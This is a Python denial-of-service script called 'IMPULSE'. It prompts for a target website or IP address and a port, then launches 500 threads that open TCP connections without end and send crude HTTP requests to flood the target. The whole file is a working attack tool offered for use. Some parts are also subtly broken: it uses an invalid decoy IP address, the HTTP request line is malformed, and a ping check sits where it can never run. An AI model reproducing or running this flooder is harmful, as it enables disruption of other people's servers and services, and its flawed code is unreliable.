import socket
import time
import threading
import sys
import os



iip = "123.432.34.5"
ip = "s"

def banner():
    print('''
                               
                        ██ ███    ███ ██████  ██    ██ ██      ███████ ███████ 
                        ██ ████  ████ ██   ██ ██    ██ ██      ██      ██      
                        ██ ██ ████ ██ ██████  ██    ██ ██      ███████ █████   
                        ██ ██  ██  ██ ██      ██    ██ ██           ██ ██      
                        ██ ██      ██ ██       ██████  ███████ ███████ ███████ 
                                                                   VERSION 1.0
                                            
                                            DEVELOPED BY PRATHEEK 'THE P0intMaN'
                                                       
               +-+-+-+-+-+-+-+-+ DO NOT COPY THE CODE WITHOUT PRIOR CONSENT +-+-+-+-+-+-+
               -+-+-+-+-+-+-+-+-+- PLEASE RESPECT DEVELOPERS AND THEIR WORK :) +-+-+-+-+-                                                  
    

    ''')


def error():
    print("\nInavlid Input!! SHUTTING DOWN INTERFACE...")
    time.sleep(3)
    sys.exit(1)


banner()
print("\n\n------ INITAILSING IMPULSE INTERFACE ------")
time.sleep(4)


choice = int(input("\nEnter the Choice of Input => 1. Website  ||  2. IP Address of Website --> "))
if choice == 1 :
    try:
        name = input("\nEnter the Website address --> ")
        ip = socket.gethostbyname(name)
        port = int(input("Enter the port to be IMPULSED (Default usage: port 80) --> "))        
    except:
        print("Website not found!")
        sys.exit(1)     

if choice == 2:
    ip = input('\nEnter the target IP Address --> ')
    port = int(input("Enter the port to be IMPULSED (Default usage: port 80) --> ")) 
if choice > 2:
    error()


def autoddos():
    
    print("\n\n------ DOS SESSION IS LIVE! [ NOW THERE IS NO LOOKING BACK :) ] ------")
    time.sleep(5)
    print(" \n------ YOU CAN TERMINATE DOSING BY EXITING IMPULSE ------")
    time.sleep(3)

def ddos():
    while True:
        a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        a.connect((ip, port))
        a.sendto(('GET/' + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
        a.sendto(('HOST: ' + iip + "\r\n\r\n").encode('ascii'), (ip, port))
        a.close()
        print("DOSING -- PACKETS SUCCESSFULLY SENT...")


    checkresult = os.system('ping -n 4 {}'.format(ip))
    if checkresult == 0:
        print("\nYour Input is Valid! Redirecting to the Interface...")
        time.sleep(3)
    else:
        error()
    
       
autoddos()
for i in range(500):
    thread = threading.Thread(target= ddos)
    thread.start()
